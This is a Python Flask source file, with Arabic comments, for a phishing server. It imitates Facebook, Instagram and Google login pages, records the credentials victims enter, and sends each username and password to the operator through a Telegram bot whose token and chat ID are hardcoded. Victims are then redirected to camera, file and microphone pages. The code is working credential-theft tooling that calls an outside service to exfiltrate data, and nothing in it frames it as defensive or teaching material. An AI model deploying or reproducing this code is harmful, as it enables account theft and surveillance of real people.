import os
import telebot
from flask import Flask, render_template, request, redirect, url_for
import threading
import time

app = Flask(__name__)

# إعدادات البوت
TOKEN = "8046641556:AAHeG0Lpwn5DGaALj4mKsl2C2BOjiWge5OQ"
CHAT_ID = "8059875744"
bot = telebot.TeleBot(TOKEN)

# تخزين البيانات المسروقة
stolen_data = {
    "credentials": [],
    "files": [],
    "photos": [],
    "audio": []
}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        stolen_data["credentials"].append({"platform": "facebook", "username": username, "password": password})
        bot.send_message(CHAT_ID, f"🎯 New Facebook Credentials:\n👤 Username: {username}\n🔑 Password: {password}")
        return redirect(url_for('camera'))
    return render_template('facebook.html')

@app.route('/camera')
def camera():
    return render_template('camera.html')

@app.route('/files')
def files():
    return render_template('files.html')

@app.route('/mic')
def mic():
    return render_template('mic.html')

@app.route('/info')
def info():
    return render_template('info.html', data=stolen_data)

def run_flask():
    app.run(host='0.0.0.0', port=5000)

def send_telegram_notification():
    bot.send_message(CHAT_ID, "🛡️ Phishing server is now running!")



@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        stolen_data["credentials"].append({"platform": "instagram", "username": username, "password": password})
        bot.send_message(CHAT_ID, f"📸 New Instagram Credentials:\n👤 Username: {username}\n🔑 Password: {password}")
        return redirect(url_for('camera'))
    return render_template('instagram.html')

@app.route('/google', methods=['GET', 'POST'])
def google():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        stolen_data["credentials"].append({"platform": "google", "username": username, "password": password})
        bot.send_message(CHAT_ID, f"📧 New Google Credentials:\n👤 Username: {username}\n🔑 Password: {password}")
        return redirect(url_for('camera'))
    return render_template('google.html')

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()
    send_telegram_notification()
    while True:
        time.sleep(1)
